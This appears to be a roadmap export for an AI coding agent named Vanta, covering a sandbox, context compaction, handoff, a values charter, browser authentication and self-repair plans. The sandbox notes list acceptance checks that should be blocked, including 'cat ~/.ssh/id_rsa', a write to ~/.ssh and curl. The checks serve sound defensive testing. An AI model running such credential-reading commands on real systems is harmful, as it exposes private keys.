items.notes: SHIPPED 2026-06-10 (design-first: docs/design-cc-sandbox.md → agent + parent integration). OPT-IN (VANTA_SANDBOX=1, default OFF; default path byte-identical). sandbox/profile.ts: pure buildSeatbeltProfile / buildBwrapArgs / detectBackend / wrapCommand — deny-default, write only under root + resolveWritableZones (+ tmpdir for run_code), DENY the SAME DANGEROUS_DIRS the file tools use (exported from writable-zones.ts — single source, can't drift), network denied unless VANTA_SANDBOX_NET=1. sandbox/run.ts: maybeSandbox({env,root,baseCmd,baseArgs}) wraps under the flag (writes Seatbelt profile to a temp file + cleanup) or returns base unchanged; when VANTA_SANDBOX=1 but no backend → error sentinel (fail-closed, never silent-unsandboxed). Wired into shell-cmd.ts + run-code.ts exec seams (rust compile step sandboxed too); detached background tasks REFUSE under the flag (no exit-time cleanup for unref'd children). +35 unit tests; full suite 2229 green, tsc clean. ⚠ LIVE OS ENFORCEMENT UNVERIFIED — sandbox-exec/bwrap couldn't run in the build env; only the generated profile/argv SHAPE is tested. Fail-closed (deny-default → a wrong profile fails LOUD, not a silent hole). MUST run the manual acceptance checks before relying on it: under VANTA_SANDBOX=1 — echo>~/Desktop/ok allowed; echo>~/.ssh/evil + cat ~/.ssh/id_rsa blocked; curl blocked unless VANTA_SANDBOX_NET=1. If `sandbox-exec -f profile sh -c 'echo hi'` fails first, the process-exec allows need widening.

items.title: Auto-compact — automatic context compaction when window fills to threshold
items.summary: CC automatically triggers conversation compaction when context fills. `isAutoCompactEnabled()` checks settings + env (`CLAUDE_CODE_AUTO_COMPACT_WINDOW`). Reserves 20K tokens for summary output, respects manual/auto compact buffer sizes. Runs `compactConversation()` then `runPostCompactCleanup()`. Distinct from manual /compact and time-based microcompact.
items.done: When context reaches the auto-compact threshold, a compact runs automatically without user action. A compact boundary message shows what was summarized.
items.notes: onAutoCompact callback on AgentDeps; trackedSummarize wrapper in runTurn emits callback when compressMessages fires; wired in app.tsx + interactive.ts. VANTA_AUTO_COMPACT_THRESHOLD configures fill pct. Test proves callback fires with seeded history.

items.title: Emergent self-designed brain
items.summary: Let Vanta design its own brain substrate (its own format/code).
items.done: Open research — no fixed done line.

items.title: Dynamic workflows (agent writes its own orchestration harness)
items.summary: From Anthropic’s Claude Code team (Thariq Shihipar & Sid Bidasaria, “A harness for every task”, /Desktop PDF). Let Vanta write its own JS orchestration harness on the fly to spawn+coordinate sub-agents, extending the existing delegate+swarm. Canonical patterns: classify-and-act, fan-out-and-synthesize, adversarial-verification, generate-and-filter, tournament, loop-until-done. Combats the long-context failure modes the article names — agentic laziness (stops at 20/50 items), self-preferential bias (prefers own results when judging), goal drift (loses the objective after compaction) — by giving each sub-agent its own clean context + isolated goal. Token budgets (“use 10k tokens”), worktree isolation, model/intelligence routing per subtask, save/reuse workflows. VISION TIE-IN: this is executive function FOR THE AGENT — making Vanta itself finish and stay on-objective — the mirror of the human-EF moat. Pairs with Vanta’s /goal + a /loop equivalent.
items.done: Vanta can compose+run a multi-agent workflow (fan-out/synthesize, adversarial-verify, tournament, loop-until-done) with a token budget; a long/parallel task that single-context drifts on completes without agentic laziness or goal drift.

items.title: Safe kernel self-repair (propose→prove→swap)
items.summary: Design: docs/self-repair-architecture.md. Limbs already self-heal (O11+factory); this closes the skeleton/kernel tier WITHOUT letting the running boundary edit itself in place. (1) propose-only candidate kernel binary, never overwrite live; (2) differential safety-invariant conformance — the OLD kernel judges the NEW, reject if more permissive on any Rule-Zero case; (3) blue-green shadow swap + auto-rollback to last-good (never breaks the system); (4) human promotion for any safety-contract diff, classifier FAILS CLOSED; (5) immutable trust root = the promotion authority + invariant spec (machine-checkable twin of MANIFESTO Rule Zero) — the one thing Vanta cannot self-modify. ND fit F6 (an agent that maintains itself removes the vigilance burden). HORIZON — kernel blast radius; kernel stays hard-blocked until built.
items.done: A non-weakening kernel change promotes via conformance + blue-green with auto-rollback; any safety-contract change requires human promotion; the live boundary is never edited in place.

items.title: Top-of-mind reminder (MOIM)
items.summary: Ported from Goose 'tom'/MOIM. A short pinned 'what am I doing / don't forget X' note the user sets, injected into every turn's prompt as a volatile tier. Pure working-memory offload — smallest, highest-fit ND feature. ND fit F2+F5.
items.done: User pins a top-of-mind note; it appears in the prompt every turn until cleared; survives across a session.

items.title: Bash comment-as-label — first # line becomes tool-use display label
items.summary: CC extracts the first `# comment` line from a bash command and uses it as the tool-use display label in fullscreen mode, and as the collapse-group hint. Users can annotate scripts with human-readable descriptions that appear in the UI instead of the raw command.
items.done: First `# comment` in a bash command block renders as the display label in tool call UI; raw command still executes.
items.notes: bashLabel() in tool-display.ts; shell_cmd uses first # comment as display label, falls back to truncated command.

items.title: Fix model-persistence regression
items.summary: SHIPPED 2026-06-07. Root cause: the live.env still held the LEGACY ARGO_PROVIDER=codex, and the back-compat shim mirrors ARGO_*->VANTA_* when VANTA_* is unset — the stuck-on-codex symptom. Two fixes: (1) /model <arg> was a no-op print; now routes through the picker's switch path (parseModelArg + repl/model-cmd.ts) — hot-swaps the live convo + post-turn pipeline + persists. (2) upsertEnvMigratingLegacy strips the stale ARGO_ twin on any explicit model write (picker + setup wizard), so the choice is the single source of truth and codex can't shadow it. TUI banner refreshes on /model <arg> via SlashResult.provider. Proven by a clean fresh-process relaunch sim (resolves the picked model, ARGO_PROVIDER gone). +10 tests; full suite 1134 green; tsc clean.
items.done: Pick a model -> it is still active next launch, proven by a relaunch.

items.title: Natural, warm-but-not-fake voice (not cold/robotic)
items.summary: Goal: Vanta sounds natural and human-legible, not clipped or cold. Jason flagged the safety/operator text as 'very hard and cold.' Resolves the tension with BEHAVIOR-VOICE (direct, literal, no AI-magic): operator-precise AND warm enough -- calm, loyal, plain-spoken, dry register, never fake-cheerful, never corporate, never robotic. Tunes SOUL.md + the prompt + TRUST-LABELS phrasing so honesty reads as care, not coldness. Rationale locked in DECISIONS.md (warm-precise reconciliation). [2026-06-07] Substance is in place — prompt rule 10 carries 'warm enough to be human, never fake-cheerful or robotic' and SOUL.md is already warm-operator. BLOCKED on Jason: the done criterion is 3 before/after sample approvals, which only he can give. Stays next until then.
items.done: Side-by-side, a stock reply reads warmer and more natural than the current clipped voice while staying precise -- verified on 3 before/after samples Jason approves.

items.title: The not-evil charter (inspectable values constitution)
items.summary: wants3's explicit should / should-not list as a written, inspectable values artifact under.vanta/self/ (with SCAFFOLD): loyal to Jason's agency, honest about limits, ask before risk, stay interruptible/inspectable, keep humans central; never deceive, manipulate, seek power, self-preserve against Jason, bypass gates, or replace human connection. JARVIS+HAL+Skynet capability, none of the danger. Wires to the kernel's rule-zero (scope + approval are already enforced) and makes the VALUES explicit + reviewable, not just the gates. Locked in DECISIONS.md.
items.done: A versioned.vanta/self/charter file states the should/should-not list, is loaded into the system prompt, and is referenced by the protection review path.

items.title: Collapsible 'think out loud' (accordion, no wall of text)

Extends TUI-THINK (collapsible thinking, shipped) + UI-READABILITY + TUI-SMOOTH: apply the fold to ALL verbose output (long tool reasoning, multi-section design dumps like the vanta ability design), default-collapsed with a one-line summary + expand affordance. Pairs with nd-sensory-load (compressed by default).
items.done: A long reasoning/design block renders as a one-line collapsed summary with a keybind/accordion to expand; the screen is not flooded by default.

items.title: Collapse long pastes to [Pasted text #N] (Claude-CLI style)
items.summary: SHIPPED 2026-06-05 (core). tui/paste.ts (pure: shouldCollapse/pasteRef/collapse/expandPastes + PasteStore) + composer.tsx wiring: a large pasted block (>=200 chars or >=4 lines, delivered as one input event) is replaced in the composer with a compact '[Pasted text #N +L lines]' reference and stashed; expanded back to the full text on submit; store resets on clear. Stops a long paste from flooding the TUI (the wall-of-text Jason hit). 9 unit tests, full suite 1101 green, tsc clean. CAVEAT: collapse fires only when the terminal delivers the paste as one event (bracketed paste); char-by-char terminals fall back to normal insert. Interactive feel needs a real-terminal paste to confirm. Spec: docs/tui-keybindings.md.
items.done: Pasting a long block shows a one-line [Pasted text #N +L lines] in the composer instead of flooding it; submitting sends the full expanded text. Pure core unit-tested; interactive verification on a real terminal pending.

Build approach is model-driven (verified live).

items.title: Live roadmap kanban (you + Vanta control) + WIP limit
items.summary: The roadmap IS already a kanban (status enum = columns; render.ts renders Now/Next/Later). Make it bi-directionally LIVE, source of truth stays roadmap.json (agent-ready, git-versioned). (1) Vanta control: roadmap_move tool + `vanta roadmap move <id> <status>` (kernel-gated write→regenerate); the dark factory moves cards next→building on start, building→shipped on verified-commit. (2) Human control: roadmap.html drag-to-move POSTs to a tiny local endpoint (vanta roadmap serve / kernel /api/roadmap/move) that rewrites roadmap.json. (3) THE EF FEATURE — a hard WIP limit on Now(building)=1-2: moving a 3rd card in refuses and asks you to finish or park one. WIP limit = the anti-bounce/finish-what-you-start prosthesis (targets the documented ideas-rich/finish-poor pattern + this session’s live 8-goal bounce). Ship #1 first (smallest slice). Research: docs/kanban-roadmap-research.md. ND fit F2+F4+F5+F6.
items.done: Both you and Vanta move cards on one live board (roadmap.json source); Now is WIP-limited and refuses a 3rd card until one is finished or parked.

items.title: Auto-handoff on context pressure + reload on restart
items.summary: SHIPPED 2026-06-07. Built on HANDOFF-PACKET: extracted assembleHandoff (shared by /handoff + auto). repl/auto-handoff.ts — shouldAutoHandoff (fill ≥ VANTA_AUTOHANDOFF_THRESHOLD, default 0.75) + maybeAutoHandoff writes a durable resume block to.vanta/handoff.md when context crosses the threshold (est = real last-prompt inputTokens, else chars/4). Both hosts call it post-turn and note once. RELOAD: prepareRun, gated to interactive launches (instruction === 'interactive session', so one-shot/factory/desktop are unaffected), injects a recent (≤7d) resume block into the system prompt and CONSUMES it (clearAutoHandoff) so it resumes once, not forever. Opt-out VANTA_AUTOHANDOFF=0. 11 unit tests (threshold, write/read/clear roundtrip incl. staleness, maybeAutoHandoff); full suite 1199 green; tsc clean.
items.done: When context crosses a threshold Vanta auto-writes a durable resume block and reloads it on next launch; Jason never has to type 'give me a handoff' or re-explain state.

items.title: Grouped parallel tool calls — batch visual rendering

items.done: Parallel tool calls from the same batch are rendered as a group; each tool can provide a renderGroupedToolUse implementation; in-progress / resolved / error states render per-call within the group.
items.notes: isGrouped on ToolEntry (set in reducer); EntryRow renders │ connector for grouped tools. True collapse-to-one-row deferred to CC-VIRTUAL-LIST.

items.done: File reads and search results > N lines (configurable, default 20) render collapsed to a summary line; Ctrl+O or a keybinding expands/collapses; the full output is never lost.
items.notes: lineCount on ToolEntry; INLINE_MAX=5/FOLD_PREVIEW=12 in tool-result.ts; short outputs inline always, long fold behind ^O; hasFoldable fixed.

items.title: Persistent operator task stack + loop-closing
items.summary: A durable task stack with explicit in-progress / blocked / parked / done states, surfaced on demand, and loop-closing ('I said I would do X - here is whether X happened'). Builds on todo/store, closure-gate, and /wm working memory.
items.done: Vanta tracks every committed task to closure and can answer 'where are we?' with accurate states.

items.title: Durable-vs-noise classification + relevance-gated surfacing
items.summary: Classify durable facts (taste, projects, people, workflows, decisions) vs temporary session noise, and surface memory only when relevant to the current task - never as clutter. Builds on brain regions, capped/pruned memory/store, and recall.
items.done: Vanta recalls the right durable fact at the right moment without dumping irrelevant memory.

items.title: Periodic memory curator (compress -> merge -> forget)
items.summary: FIRST SLICE of the living-operator arc (wants2 #1, its named step 1). A cheap/local-model pass that runs occasionally (session end / cron / heartbeat) and asks: what changed, what did I learn, what to remember about Jason, what mistake not to repeat, what goal stays salient, what to compress or forget. Writes one durable note per lasting event and merges related notes. Adds verbal controls: 'remember X', 'forget that', 'compress today', 'this is identity', 'not important'. Extends MEM-COMPRESS + MEM-VERSIONING; runs on the E-eff2/AUX-MAP local route so it stays near-free.
items.done: Ending a session triggers a curator pass that emits or merges durable notes and is overridable by a verbal 'forget that' / 'remember X' command, proven by a stored-note diff.

items.title: Authenticated browser profile for logged-in sites
items.summary: Opt-in persistent Playwright profile so Vanta browses logged-in sites (X, GitHub, Google, dashboards) WITHOUT stealing cookies from your real browser. 'vanta browser auth <site>' opens a headed window in a dedicated profile under ~/.vanta/browser-profiles/<site>/ (outside the repo) -> you log in manually (Vanta never sees password/2FA) -> browser_extract_auth reads logged-in pages headless via launchPersistentContext. Domain-bound per profile, read-only by default (navigate/click/post = explicit approval each time), NEVER returns cookies/localStorage/auth headers. Extends the existing browser tools + isAllowedDomain. Packaged as Vanta's FIRST capability plugin (tools + skill + lazy deps in OS cache). Design + slices: docs/plugins-and-auth-browser.md.
items.done: 'vanta browser auth x.com' opens a dedicated profile, Jason logs in manually, then browser_extract_auth reads X search results from that profile while cookies stay confined to ~/.vanta/browser-profiles and are never exposed to the model; tests prove id-sanitization + domain-binding + no-cookie-leak.
items.notes: SHIPPED 2026-06-10 (parallel agent + parent verified-integration; LIVE browser flow needs `npx playwright install chromium` to verify). browser/profile.ts: browserProfileDir(env) (~/.vanta/browser-profile, VANTA_BROWSER_PROFILE) + pure usesPersistentProfile(env) (VANTA_BROWSER_PROFILE_ENABLED=1 OR dir exists). browser/launch.ts: shared acquirePage(chromium, env, {headless?}) → persistent (launchPersistentContext, reuses pages()[0]) vs ephemeral (launch()+newPage()) + close(). cli/browser-cmd.ts: `vanta browser auth <site>` opens a HEADED persistent context so the user logs in once; session persists for later headless tool use; cookies never stolen from the real browser. The 3 browser tools (navigate/extract/screenshot) swap to acquirePage. CLI table + completion + .env.example wired. Default (no profile) path behavior-identical. +16 offline tests; full suite 2200 green, tsc clean (parent fixed an as-cast in launch.test.ts that the agent's tsconfig missed). LIVE-PENDING: the auth login + headless logged-in reuse (needs chromium).
